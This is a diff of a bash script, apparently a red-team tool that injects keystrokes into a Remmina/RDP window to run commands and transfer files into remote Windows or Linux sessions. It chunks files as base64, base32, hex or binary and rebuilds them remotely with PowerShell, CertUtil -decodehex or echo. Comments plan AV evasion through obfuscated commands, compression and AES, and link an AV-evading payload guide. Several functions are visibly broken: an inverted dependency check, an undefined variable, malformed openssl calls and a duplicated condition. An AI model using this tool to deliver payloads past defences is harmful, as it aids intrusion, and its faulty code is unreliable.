@@ -1,67 +1,93 @@
-#!/bin/bash
+#!/usr/bin/env bash
 
-function print_status() {
-    local status="${1}"
-    local message="${2}"
+set -euo pipefail
 
-    # Blue for information
-    # Bold Blue for progress
-    # Bold Green for completed
-    # Bold Yellow for warning
-    # Bold Red for error
-    # * default to white
-    case "${status}" in
-        information) color="\033[34m[INFO]\033[0m" ;;
-        progress) color="\033[1;34m[PROG]\033[0m" ;;
-        completed) color="\033[1;32m[DONE]\033[0m" ;;
-        warning) color="\033[1;33m[WARN]\033[0m" ;;
-        error) color="\033[1;31m[ERROR]\033[0m" ;;
-        *) color="\033[0m" ;;
-    esac
+BLUE="\033[1;34m"
+GREEN="\033[1;32m"
+RED="\033[1;31m"
+YELLOW="\033[1;33m"
+RESET="\033[0m"
 
-    echo -e "${color} ${message}"
+OPTIONS=""
+LONG_OPTIONS=""
+PARSED_OPTIONS=$(getopt -o "${OPTIONS}" -l "${LONG_OPTIONS}" -n "$(basename "${0}")" -- "${@}")
+
+function check_program() {
+    type -P "${1}" 2>/dev/null
+}
+
+function print() {
+    local text="${1}"
+
+    echo -e "${text}"
+}
+
+function info() {
+    local message="${1}"
+    local color="${BLUE}[*]${RESET}"
+
+    print "${color} ${message}"
+}
+
+function finish() {
+    local message="${1}"
+    local color="${GREEN}[*]${RESET}"
+
+    print "${color} ${message}"
+}
+
+function warn() {
+    local message="${1}"
+    local color="${YELLOW}[*]${RESET}"
+
+    print "${color} ${message}"
+}
+
+function error() {
+    local message="${1}"
+    local color="${RED}[*]${RESET}"
+
+    print "${color} ${message}"
+}
+
+function quit() {
+    local code="${1}"
+
+    ((code != 0)) && info "Terminating program..."
+    exit "${1}"
 }
 
 function check_dependencies() {
-    local programs=("remmina")
-    local missing_dependencies=()
+    local -a programs=("remmina" "getopt")
+    local -a missing=()
 
     if [[ "${XDG_SESSION_TYPE}" == "x11" ]]
     then
         programs+=("xdotool")
         programs+=("xfreerdp")
-    elif [[ "${XDG_SESSION_TYPE}" == "wayland" ]]
-    then
-        programs+=("dotool")
-        programs+=("kdotool")
-        programs+=("wlfreerdp")
     fi
 
     for program in "${programs[@]}"
     do
-        if [[ -z $(which "${program}") ]]
+        if [[ $(check_program "${program}") ]]
         then
-            missing_dependencies+=("${program}")
+            if [[ "${program}" == "getopt" ]]
+            then
+                missing+=("util-linux")
+            else
+                missing+=("${program}")
+            fi
         fi
     done
 
-    if [[ ${#missing_dependencies[@]} -ne 0 ]]
+    if ((${#missing[@]} > 0))
     then
-        print_status "warning" "Required dependencies: ${missing_dependencies[@]}"
-        print_status "information" "Terminating program..."
-        exit 1
+        error "Required dependencies: ${missing[*]}"
     fi
 }
 
 function get_window_name() {
-    if [[ "${XDG_SESSION_TYPE}" == "x11" ]]
-    then
-        xdotool search --name "${WINDOWNAME}" getwindowname
-    elif [[ "${XDG_SESSION_TYPE}" == "wayland" ]]
-    then
-        kdotool search --name "${WINDOWNAME}" getwindowname
-    fi
-
+    xdotool search --name "${WINDOWNAME}" getwindowname
     return ${?}
 }
 
@@ -69,8 +95,8 @@ function keyboard() {
     local input="${1}"
     local key="${2}"
 
-	if [[ "${XDG_SESSION_TYPE}" == "x11" ]]
-	then
+    if [[ "${XDG_SESSION_TYPE}" == "x11" ]]
+    then
         case "${key}" in
             "keystrokes")
                 xdotool search --name "${WINDOWNAME}" windowactivate type "${input}"
@@ -82,62 +108,152 @@ function keyboard() {
                 xdotool search --name "${WINDOWNAME}" windowactivate key "${input}"
                 ;;
         esac
-	elif [[ "${XDG_SESSION_TYPE}" == "wayland" ]]
-	then
-        case "${key}" in
-            "keystrokes")
-                kdotool search --name "${WINDOWNAME}" windowactivate && { echo type "${input}" } | dotool
-                ;;
-            "escape_keystrokes")
-                kdotool search --name "${WINDOWNAME}" windowactivate && { echo type "${input}" } | dotool
-                ;;
-            "custom_keystroke")
-                kdotool search --name "${WINDOWNAME}" windowactivate && { echo key "${input}" } | dotool
-                ;;
-        esac
-	fi
+    elif [[ "${XDG_SESSION_TYPE}" == "wayland" ]]
+    then
+        error "Wayland isn't supported!"
+    fi
+}
+
+function count_lines() {
+    wc -l < "${1}" 2>/dev/null
+}
+# TODO: Fill these execution methods in SCPA notes "searchbox" and "dialogbox"
+function read_input() {
+    local commands="${1}"
+    local method="${2}"
+
+    function execute() {
+        # TODO: https://github.com/RoseSecurity/Anti-Virus-Evading-Payloads/blob/main/Bypass-AV-Payload-Detection.md
+        # Obfuscate linux commands (detect PLATFORM first then) using hex, octal, unicode hex 4, and unicode hex 8
+        info "Executing commands..."
+        keyboard "${commands}" "escape_keystrokes"
+        keyboard "Return" "custom_keystroke"
+        finish "Task completed!"
+    }
+
+    function read_text_file() {
+        local file="${commands}"
+        local file_type=$(file -b --mime-encoding "${file}")
+        local lines=$(count_lines "${file}")
+        local contents
+
+        if [[ "${file_type}" == "binary" ]]
+        then
+            error "The file must be a text file! Terminating program."
+        fi
+
+       info "Executing commands..."
+        # If there are zero new lines just read the remaining file's contents.
+        if ((lines == 0))
+        then
+            contents=$(< "${file}")
+            keyboard "${contents}" "escape_keystrokes"
+            keyboard "Return" "custom_keystroke"
+        else
+            while read -r line
+            do
+                keyboard "${line}" "escape_keystrokes"
+                keyboard "Return" "custom_keystroke"
+            done < "${file}"
+        fi
+        finish "Task completed!"
+    }
+
+    function search_box() {
+        if [[ "${PLATFORM}" != "windows" ]]
+        then
+            error "This execution method is only exclusive for windows!"
+            quit 1
+        fi
+
+        info "Checking one of the lines reaches 400 character limit"
+        if ((${#commands} > 400))
+        then
+            error "Character Limit reached!"
+            quit 1
+        fi
+
+        info "Executing commands..."
+        keyboard "Super+s" "custom_keystroke"
+        keyboard "${commands}" "escape_keystrokes"
+        keyboard "Return" "custom_keystroke"
+        finish "Task completed!"
+    }
+
+    function dialogue_box() {
+        if [[ "${PLATFORM}" != "windows" ]]
+        then
+            error "This execution method is only exclusive for windows!"
+            quit 1
+        fi
+
+        info "Checking one of the lines reaches 260 character limit"
+        if ((${#commands} > 260))
+        then
+            error "Character Limit reached!"
+            quit 1
+        fi
+
+        info "Executing commands..."
+        keyboard "Super+r" "custom_keystroke"
+        keyboard "${commands}" "escape_keystrokes"
+        keyboard "Return" "custom_keystroke"
+        finish "Task completed!"
+    }
+
+    case "${method}" in
+        "none")
+            if [[ ! -f "${commands}" && -n "${commands}" ]]
+            then
+                execute
+            elif [[ -f "${commands}" ]]
+            then
+                read_text_file
+            fi
+            ;;
+        "searchbox")
+            search_box
+            ;;
+        "dialogbox")
+            dialogue_box
+            ;;
+        *)
+            error "Invalid Execution Type!" >&2
+            info "Available methods are: none, and dialogbox"
+            quit 1
+            ;;
+    esac
 }
 
 function random_string() {
     local -a characters=({a..z} {A..Z} {0..9})
-    local length=$(( RANDOM % 13 + 8 ))  # A length of characters between 8 and 20
+    local length=$((RANDOM % 13 + 8))  # A length of characters between 8 and 20
     local string=""
+    local random_index
 
-    for (( i=0; i<length; i++ ))
+    for ((i = 0; i < length; i++))
     do
-        local random_index=$(( RANDOM % ${#characters[@]} ))
+        random_index=$((RANDOM % ${#characters[@]}))
         string+=${characters[$random_index]}
     done
 
     echo "${string}"
 }
 
-function count_lines() {
-    local file="${1}"
-    local counter=0
-
-    while read -r line
-    do
-        (( counter++ ))
-    done < "${file}"
-
-    echo "${counter}"
-}
-
-# There is a limitation with this implementation.
-# However, it is ideal for uploading files with a specific path.
+: <<-'COMMENT'
+There is a limitation with this implementation.
+However, it is ideal for uploading files with a specific path.
+COMMENT
 
 function directory_name() {
     local filepath="${1}"
     local directory_name
-
     # Determine the type of slashes used in the path
     if [[ "${filepath}" == *\\* ]]
     then
         # Handle paths with backslashes (Windows style)
-        directory_name="${filepath%\\*}"
-
         # Special case: if the result is empty, it means the path was something like "C:\file"
+        directory_name="${filepath%\\*}"
         if [[ -z "${directory_name}" || "${directory_name}" == "${filepath}" ]]
         then
             echo "."
@@ -153,9 +269,8 @@ function directory_name() {
             return
         fi
 
-        directory_name="${filepath%/*}"
-
         # Special case: if the result is empty, it means the path was something like "/file"
+        directory_name="${filepath%/*}"
         if [[ -z "${directory_name}" || "${directory_name}" == "${filepath}" ]]
         then
             echo "/"
@@ -165,215 +280,293 @@ function directory_name() {
         echo "${directory_name}"
     fi
 }
-
-# Retrieving the filename and strips the directory while it
-# keeps the suffix
-function base_name() {
-    local path="${1}"
-    local filename="${path##*/}"
-
-    echo "${filename}"
-}
-
-function terminate_program() {
-    print_status "warning" "SIGINT response detected!"
-    print_status "information" "Terminating program..."
-    exit 1
-}
-
-trap terminate_program SIGINT
-
-function automate() {
-    local file="${1}"
-    local lines=$(count_lines "${file}")
-
-    print_status "progress" "Executing commands..."
-
-    # If there are zero new lines just read the remaining file's contents.
-    if [[ ${lines} -eq 0 ]]
-    then
-        read contents < "${file}"
-        keyboard "${contents}" "escape_keystrokes"
-        keyboard "Return" "custom_keystroke"
-    else
-        while read -r line
-        do
-            keyboard "${line}" "escape_keystrokes"
-            keyboard "Return" "custom_keystroke"
-        done < "${file}"
-    fi
-    print_status "completed" "Task completed!"
-}
-
-function dialogue_box() {
-    local commands="${1}"
-
-    if [[ "${PLATFORM}" != "windows" ]]
-    then
-        print_status "error" "This execution method is only exclusive for windows!"
-        print_status "information" "Terminating program..."
-        exit 1
-    fi
-
-    print_status "information" "Checking one of the lines reaches 260 character limit"
-    if [[ ${#commands} -ge 260 ]]
-    then
-        print_status "error" "Character Limit reached! Terminating program."
-        exit 1
-    fi
-
-    print_status "progress" "Executing commands..."
-    keyboard "Super+r" "custom_keystroke"
-    keyboard "${commands}" "escape_keystrokes"
-    keyboard "Return" "custom_keystroke"
-    print_status "completed" "Task completed!"
-}
-
-function execute() {
-    local commands="${1}"
-    local method="${2}"
-
-    case "${method}" in
-        none)
-            print_status "progress" "Executing commands..."
-            keyboard "${commands}" "escape_keystrokes"
-            keyboard "Return" "custom_keystroke"
-            print_status "completed" "Task completed!"
-            ;;
-        dialogbox)
-            dialogue_box "${commands}"
-            ;;
-        *)
-            print_status "error" "Invalid Execution Type!" >&2
-            print_status "information" "Available methods are: none, and dialogbox"
-            print_status "information" "Terminating program..."
-            exit 1
-            ;;
-    esac
-}
-
-function base64_encoding_scheme() {
-    local input="${1}"
-    local output_file="${2}"
-    local mode="${3}"
-    local file_character_set=$(file --mime-encoding "${input}")
-    local file_type=${file_character_set##*: }
+# TODO: https://devblogs.microsoft.com/scripting/increase-powershell-command-history-to-the-max-almost/
+# The maximum length of lines is total of 32768 (lines > 32767) when executing through Windows PowerShell or Windows Terminal.
+function upload() {
+    local local_file="${1}"
+    local remote_file="${2}"
+    local method="${3}"
+    local submethod="${4}"
+    local action="${5}"
+    local evasion="${6}"
+    local file_type=$(file -b --mime-encoding "${local_file}")
+    local lines=$(count_lines "${local_file}")
+    local -a encoded=()
+    local counter
+    local directory_path=$(directory_name "${remote_file}")
+    local temporary_file=$(random_string)
     local data
-    local chunks=100
-    local random_variable_one=$(random_string)
-    local random_variable_two=$(random_string)
-
-    # TODO: Implement encryption method through base64 with -e,--evasion flag
-    # $ rks -i file -o output -m pwshb64 -e compression
-    # $ iconv -t UTF-16LE file.txt | gzip | basenc -w 0 --base64
-    # $ gzip -c file.exe | basenc -w 0 --base64
-
-    # $ rks -i file -o output -m pwshb64 -e aes256
-    # $ iconv -t UTF-16LE file.txt | gzip | openssl enc -a -e -A
-    # $ gzip -c file.exe | openssl enc -a -e -A
-
-    # Check if input is passed as file
-    if [[ -f "${input}" && ("${PLATFORM}" == "windows" || "${PLATFORM}" == "linux") && "${mode}" == "powershell" ]]
-    then
-        if [[ "${file_type}" == "binary" ]]
-        then
-            data=$(basenc -w 0 --base64 "${input}")
-        else
-            data=$(iconv -f ASCII -t UTF-16LE "${input}" | basenc -w 0 --base64)
-        fi
-
-        print_status "progress" "Transferring file..."
-
-        for (( i=0; i<${#data}; i+=chunks ))
-        do
-            if [[ ${i} -eq 0 ]]
-            then
-                keyboard "\$${random_variable_one} = \"${data:i:chunks}\"" "keystrokes"
-                keyboard "Return" "custom_keystroke"
-            else
-                keyboard "\$${random_variable_one} += \"${data:i:chunks}\"" "keystrokes"
-                keyboard "Return" "custom_keystroke"
-            fi
-        done
-
-        keyboard "[byte[]]\$${random_variable_two} = [Convert]::FromBase64String(\$${random_variable_one})" "keystrokes"
-        keyboard "Return" "custom_keystroke"
-        keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", \$${random_variable_two})" "keystrokes"
-        keyboard "Return" "custom_keystroke"
-
-        print_status "completed" "File transferred!"
-    elif [[ "${PLATFORM}" == "linux" && "${mode}" == "console" ]]
-    then
-        data=$(basenc -w 0 --base64 "${input}")
-
-        print_status "progress" "Transferring file..."
-
-        for (( i=0; i<${#data}; i+=chunks ))
-        do
-            if [[ ${i} -eq 0 ]]
-            then
-                keyboard "${random_variable_one}=\"${data:i:chunks}\"" "keystrokes"
-                keyboard "Return" "custom_keystroke"
-            else
-                keyboard "${random_variable_one}+=\"${data:i:chunks}\"" "keystrokes"
-                keyboard "Return" "custom_keystroke"
-            fi
-        done
-
-        keyboard "base64 -d <<< \$${random_variable_one} > \"${output_file}\"" "keystrokes"
-        keyboard "Return" "custom_keystroke"
-        print_status "completed" "File transferred!"
-    fi
-}
-
-function base32_radix() {
-    local input="${1}"
-    local output_file="${2}"
-    local mode="${3}"
-    local data
-    local chunks=100
-    local random_variable=$(random_string)
-
-    if [[ "${PLATFORM}" != "linux" ]]
-    then
-        print_status "error" "This execution method is only exclusive for linux!"
-        print_status "information" "Terminating program..."
-        exit 1
-    fi
-    # TODO: Implement this feature
-    # For linux (two types)
-    data=$(basenc -w 0 --base32 "${input}")
-    data=$(basenc -w 0 --base32hex "${input}")
-}
-
-# Using hexadecimal to encode files
-function base16_radix() {
-    local input="${1}"
-    local output_file="${2}"
-    local mode="${3}"
-    local data=$(basenc -w 0 --base16 "${input}")
-    local chunks=100
-    local random_variable=$(random_string)
-    local random_temp_file=$(random_string)
-    local directory_path=$(directory_name "${output_file}")
+    local chunks
     local temp
 
-    if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
-    then
-        print_status "error" "Only both linux and windows are supported for this method!"
-        print_status "information" "Terminating program..."
-        exit 1
-    fi
+    function _base64() {
+        local mode="${1}"
+        local action="${2}"
+        local random_variable_one=$(random_string)
+        local random_variable_two=$(random_string)
+        chunks=100
 
-    if [[ -f "${input}" ]]
-    then
-    	if [[ "${mode}" == "powershell" ]]
-    	then
-            print_status "progress" "Transferring file..."
+        # TODO: -a, --action or just -s, --submethod instead because --action is redundant
+        # -s, --submethod <none | legacy | openssl>
+        # -a, --action <none | info | compression>
+        # -e, --evasion <none | aes256>
 
-            for (( i=0; i<${#data}; i+=chunks ))
+        # TODO: Implement encryption method through base64 with -e,--evasion flag
+        # $ rks -i file -o output --method pwshb64 --submethod none --action compression
+        # $ iconv -t UTF-16LE file.txt | gzip | basenc -w 0 --base64
+        # $ gzip -c file.exe | basenc -w 0 --base64
+        # To decode it
+        # basenc --base64 -d <<< $data | gzip -d > file.exe
+
+        # For just base64 'legacy' and compressed with gzip
+        # $ rks -i file -o output --method pwshb64 --submethod legacy --action compression
+        # To decode it
+        # base64 -d <<< $data | gzip -d > file.exe
+
+        # For just 'openssl' without encryption
+        # $ rks -i file -o output -m pwshb64 --submethod openssl --evasion none
+        # $ iconv -t UTF-16LE file.txt | openssl enc -a -e -A
+        # $ openssl enc -a -e -A -in file.exe
+
+        # For just 'openssl' without encryption and compressed with gzip
+        # $ rks -i file -o output -m pwshb64 --submethod openssl --action compression
+        # $ iconv -t UTF-16LE file.txt | gzip | openssl enc -a -e -A
+        # $ gzip -c file.exe | openssl enc -a -e -A
+
+        # $ rks -i file -o output -m pwshb64 --submethod openssl --evasion aes256
+        # To encode and encrypt it with AES
+        # $ iconv -t UTF-16LE file.txt | gzip | openssl enc -a -e -A
+        # $ gzip -c file.exe | openssl enc -a -e -A
+
+        if [[ ("${PLATFORM}" == "windows" || "${PLATFORM}" == "linux") && "${mode}" == "powershell" ]]
+        then
+            if [[ "${file_type}" == "binary" ]]
+            then
+                data=$(basenc -w 0 --base64 "${local_file}")
+            else
+                data=$(iconv -f ASCII -t UTF-16LE "${local_file}" | basenc -w 0 --base64)
+            fi
+
+            info "Transferring file..."
+
+            for ((i = 0; i < ${#data}; i += chunks))
             do
-                if [[ ${i} -eq 0 ]]
+                if ((i == 0))
+                then
+                    keyboard "\$${random_variable_one} = \"${data:i:chunks}\"" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
+                else
+                    keyboard "\$${random_variable_one} += \"${data:i:chunks}\"" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
+                fi
+            done
+            # TODO: and make a VARIANT either none or one-liner
+            keyboard "[byte[]]\$${random_variable_two} = [Convert]::FromBase64String(\$${random_variable_one})" "keystrokes"
+            keyboard "Return" "custom_keystroke"
+            keyboard "[IO.File]::WriteAllBytes(\"${remote_file}\", \$${random_variable_two})" "keystrokes"
+            keyboard "Return" "custom_keystroke"
+
+            finish "File transferred!"
+        elif [[ "${PLATFORM}" == "linux" && "${mode}" == "console" ]]
+        then
+            if [[ "${action}" == "compression" ]]
+            then
+                if [[ "${evasion}" == "aes256" ]]
+                then
+                    data=$(openssl -in "${local_file}" | gzip -c | basenc -w 0 --base64)
+                else
+                    data=$(gzip -c "${local_file}" | basenc -w 0 --base64)
+                fi
+            else
+                if [[ "${evasion}" == "aes256" ]]
+                then
+                    data=$(openssl -in "${local_file}" | basenc -w 0 --base64)
+                else
+                    data=$(basenc -w 0 --base64 "${local_file}")
+                fi
+            fi
+            data=$(basenc -w 0 --base64 "${local_file}")
+
+            info "Transferring file..."
+
+            for ((i = 0; i < ${#data}; i += chunks))
+            do
+                if ((i == 0))
+                then
+                    keyboard "${random_variable_one}=\"${data:i:chunks}\"" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
+                else
+                    keyboard "${random_variable_one}+=\"${data:i:chunks}\"" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
+                fi
+            done
+
+            if [[ "${submethod}" == "none" ]]
+            then
+                if [[ "${action}" == "none" ]]
+                then
+                    keyboard "basenc -d --base64 <<< \$${random_variable} > \"${remote_file}\"" "keystrokes"
+                elif [[ "${action}" == "compression" ]]
+                then
+                    keyboard "basenc -d --base64 <<< \$${random_variable} | gzip -d > \"${remote_file}\"" "keystrokes"
+                fi
+            elif [[ "${submethod}" == "legacy" ]]
+            then
+                if [[ "${action}" == "none" ]]
+                then
+                    keyboard "base64 -d <<< \$${random_variable} > \"${remote_file}\"" "keystrokes"
+                elif [[ "${action}" == "compression" ]]
+                then
+                    keyboard "base64 -d <<< \$${random_variable} | gzip -d > \"${remote_file}\"" "keystrokes"
+                fi
+            fi
+            keyboard "Return" "custom_keystroke"
+            finish "File transferred!"
+        fi
+    }
+
+    function _base32() {
+        local mode="${1}"
+        local random_variable=$(random_string)
+        chunks=100
+
+        if [[ "${PLATFORM}" != "linux" ]]
+        then
+            error "This execution method is only exclusive for linux!"
+            quit 1
+        fi
+        # TODO: Finish the openssl encryption implementation
+        if [[ "${mode}" == "console" ]]
+       	then
+            if [[ "${action}" == "compression" ]]
+            then
+                if [[ "${evasion}" == "aes256" ]]
+                then
+                    data=$(openssl -in "${local_file}" | gzip -c | basenc -w 0 --base32)
+                else
+                    data=$(gzip -c "${local_file}" | basenc -w 0 --base32)
+                fi
+            else
+                if [[ "${evasion}" == "aes256" ]]
+                then
+                    data=$(openssl -in "${local_file}" | basenc -w 0 --base32)
+                else
+                    data=$(basenc -w 0 --base32 "${local_file}")
+                fi
+            fi
+            info "Transferring file..."
+
+            # Split a pair of characters and make it into a hexadecimal format.
+            for ((i = 0; i < ${#data}; i += 2))
+            do
+                temp+="\\x${data:i:2}"
+            done
+
+            for ((i = 0; i < ${#temp}; i += chunks))
+            do
+                if ((i == 0))
+                then
+                    keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
+                else
+                    keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
+                fi
+            done
+
+            if [[ "${submethod}" == "none" ]]
+            then
+                if [[ "${action}" == "none" ]]
+                then
+                    keyboard "basenc -d --base32 <<< \$${random_variable} > \"${remote_file}\"" "keystrokes"
+                elif [[ "${action}" == "compression" ]]
+                then
+                    keyboard "basenc -d --base32 <<< \$${random_variable} | gzip -d > \"${remote_file}\"" "keystrokes"
+                fi
+            elif [[ "${submethod}" == "legacy" ]]
+            then
+                if [[ "${action}" == "none" ]]
+                then
+                    keyboard "base32 -d <<< \$${random_variable} > \"${remote_file}\"" "keystrokes"
+                elif [[ "${action}" == "compression" ]]
+                then
+                    keyboard "base32 -d <<< \$${random_variable} | gzip -d > \"${remote_file}\"" "keystrokes"
+                fi
+            fi
+            keyboard "Return" "custom_keystroke"
+       	fi
+        finish "File transferred!"
+    }
+
+    function base32hex() {
+        local mode="${1}"
+        local random_variable=$(random_string)
+        chunks=100
+
+        if [[ "${PLATFORM}" != "linux" ]]
+        then
+            error "This execution method is only exclusive for linux!"
+            quit 1
+        fi
+
+        if [[ "${mode}" == "console" ]]
+       	then
+            data=$(basenc -w 0 --base32hex "${local_file}")
+            info "Transferring file..."
+
+            # Split a pair of characters and make it into a hexadecimal format.
+            for ((i = 0; i < ${#data}; i += 2))
+            do
+                temp+="\\x${data:i:2}"
+            done
+
+            for ((i = 0; i < ${#temp}; i += chunks))
+            do
+                if ((i == 0))
+                then
+                    keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
+                else
+                    keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
+                fi
+            done
+
+            if [[ "${submethod}" == "none" ]]
+            then
+                if [[ "${action}" == "none" ]]
+                then
+                    keyboard "basenc -d --base32hex <<< \$${random_variable} > \"${remote_file}\"" "keystrokes"
+                elif [[ "${action}" == "compression" ]]
+                then
+                    keyboard "basenc -d --base32hex <<< \$${random_variable} | gzip -d > \"${remote_file}\"" "keystrokes"
+                fi
+            fi
+
+            keyboard "Return" "custom_keystroke"
+       	fi
+        finish "File transferred!"
+    }
+    # Using hexadecimal to encode files
+    function base16() {
+        local mode="${1}"
+        local random_variable=$(random_string)
+        data=$(basenc -w 0 --base16 "${local_file}")
+        chunks=100
+
+        if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
+        then
+            error "Only both linux and windows are supported for this method!"
+            quit 1
+        fi
+
+       	if [[ "${mode}" == "powershell" ]]
+       	then
+            info "Transferring file..."
+
+            for (( i = 0; i < ${#data}; i += chunks ))
+            do
+                if (( i == 0 ))
                 then
                     keyboard "\$${random_variable} = \"${data:i:chunks}\"" "keystrokes"
                     keyboard "Return" "custom_keystroke"
@@ -383,61 +576,83 @@ function base16_radix() {
                 fi
             done
 
-            keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
+            if [[ "${submethod}" == "none" ]]
+            then
+                if [[ "${action}" == "none" ]]
+                then
+                    keyboard "[IO.File]::WriteAllBytes(\"${remote_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
+                elif [[ "${action}" == "compression" ]] # TODO: Add compression for the powershell cmdlet
+                then
+                    keyboard "basenc -d --base32hex <<< \$${random_variable} | gzip -d > \"${remote_file}\"" "keystrokes"
+                fi
+            elif [[ "${submethod}" == "none" ]] # TODO: Add certutil to decode hexadecimal bytes as a submethod and check the code
+            then
+                if [[ "${action}" == "none" ]]
+                then
+                    keyboard "echo %${random_variable}% > \"${directory_path}\\${temporary_file}.hex\"" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
+                    keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${temporary_file}.hex\" \"${remote_file}\" 12" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
+                    keyboard "del /f \"${directory_path}\\${temporary_file}.hex\"" "keystrokes"
+                else # TODO: This must start from top if the submethod or action is not defined then it must list the available options
+                    error ""
+                    quit 1
+                fi
+            fi
             keyboard "Return" "custom_keystroke"
         elif [[ "${mode}" == "certutil" ]]
         then
             if [[ "${PLATFORM}" != "windows" ]]
             then
-                print_status "error" "This method is only exclusive for windows!"
-                print_status "information" "Use 'nixhex' as a method instead."
-                print_status "information" "Terminating program..."
-                exit 1
+                error "This method is only exclusive for windows!"
+                info "Use 'nixhex' as a method instead."
+                quit 1
             fi
 
             # TODO: Make an if statement of limited characters or lines using batch variable via command prompt
             # The maximum length of the string that you can use at the command prompt is 8191 characters.
             # https://learn.microsoft.com/en-us/troubleshoot/windows-client/shell-experience/command-line-string-limitation
-            print_status "information" "Checking 8191 character limit..."
-            if [[ ${#data} -gt 8191 ]]
+            info "Checking 8191 character limit..."
+            if ((${#data} > 8191))
             then
-                print_status "error" "Character limit!"
+                error "Character limit!"
+                quit 1
             fi
 
-            print_status "progress" "Transferring file..."
+            info "Transferring file..."
 
             # Appends the hexadecimal data in a batch file
-            for (( i=0; i<${#data}; i+=chunks ))
+            for ((i = 0; i < ${#data}; i += chunks))
             do
-                if [[ ${i} -eq 0 ]]
+                if ((i == 0))
                 then
                     keyboard "set ${random_variable}=${data:i:chunks}" "keystrokes"
                     keyboard "Return" "custom_keystroke"
                 else
-                    keyboard "set ${random_variable}=%${random_var}%${data:i:chunks}" "keystrokes"
+                    keyboard "set ${random_variable}=%${random_variable}%${data:i:chunks}" "keystrokes"
                     keyboard "Return" "custom_keystroke"
                 fi
             done
 
-            keyboard "echo %${random_var}% > \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
+            keyboard "echo %${random_variable}% > \"${directory_path}\\${temporary_file}.hex\"" "keystrokes"
             keyboard "Return" "custom_keystroke"
-            keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 12" "keystrokes"
+            keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${temporary_file}.hex\" \"${remote_file}\" 12" "keystrokes"
             keyboard "Return" "custom_keystroke"
-            keyboard "del /f \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
+            keyboard "del /f \"${directory_path}\\${temporary_file}.hex\"" "keystrokes"
             keyboard "Return" "custom_keystroke"
-    	elif [[ "${mode}" == "console" ]]
-    	then
-            print_status "progress" "Transferring file..."
+       	elif [[ "${mode}" == "console" ]]
+       	then
+            info "Transferring file..."
 
             # Split a pair of characters and make it into a hexadecimal format.
-            for (( i=0; i<${#data}; i+=2))
+            for ((i = 0; i < ${#data}; i += 2))
             do
                 temp+="\\x${data:i:2}"
             done
 
-            for (( i=0; i<${#temp}; i+=chunks ))
+            for ((i = 0; i < ${#temp}; i += chunks))
             do
-                if [[ ${i} -eq 0 ]]
+                if ((i == 0))
                 then
                     keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
                     keyboard "Return" "custom_keystroke"
@@ -446,44 +661,37 @@ function base16_radix() {
                     keyboard "Return" "custom_keystroke"
                 fi
             done
-
             # Interpret the backslash to output into a file.
-            keyboard "echo -en \$${random_variable} > \"${output_file}\"" "keystrokes"
+            keyboard "echo -en \$${random_variable} > \"${remote_file}\"" "keystrokes"
             keyboard "Return" "custom_keystroke"
-    	fi
-        print_status "completed" "File transferred!"
-    fi
-}
+       	fi
+        finish "File transferred!"
+    }
+    # Using binary digits of 1 and 0
+    # to encode files with each 8 bits of size
+    function base2() {
+        local mode="${1}"
+        local action="${2}"
+        local random_variable=$(random_string)
+        data=$(basenc -w 0 --base2msbf "${local_file}")
+        chunks=100
 
-# Using binary digits of 1 and 0
-# to encode files with each 8 bits of size
-function base2_radix() {
-    local input="${1}"
-    local output_file="${2}"
-    local mode="${3}"
-    local data=$(basenc -w 0 --base2msbf "${input}")
-    local chunks=100
-    local random_variable=$(random_string)
-    local temp
+        if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
+        then
+            error "Only both linux and windows are supported for this method!"
+            quit 1
+        fi
 
-    if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
-    then
-        print_status "error" "Only both linux and windows are supported for this method!"
-        print_status "information" "Terminating program..."
-        exit 1
-    fi
+        # TODO: Implement this feature for both linux and powershell cmdlet
+        echo "not yet implemented"
 
-    # TODO: Implement this feature for both linux and powershell cmdlet
-    echo "not yet implemented"
-    if [[ -f "${input}" ]]
-    then
-    	if [[ "${mode}" == "powershell" ]]
-    	then
-            print_status "progress" "Transferring file..."
+       	if [[ "${mode}" == "powershell" ]]
+       	then
+            info "Transferring file..."
 
-            for (( i=0; i<${#data}; i+=chunks ))
+            for ((i = 0; i < ${#data}; i += chunks))
             do
-                if [[ ${i} -eq 0 ]]
+                if ((i == 0))
                 then
                     keyboard "\$${random_variable} = \"${data:i:chunks}\"" "keystrokes"
                     keyboard "Return" "custom_keystroke"
@@ -493,21 +701,22 @@ function base2_radix() {
                 fi
             done
 
-            keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
+            # TODO: and make a VARIANT either none or one-liner
+            keyboard "[IO.File]::WriteAllBytes(\"${remote_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
             keyboard "Return" "custom_keystroke"
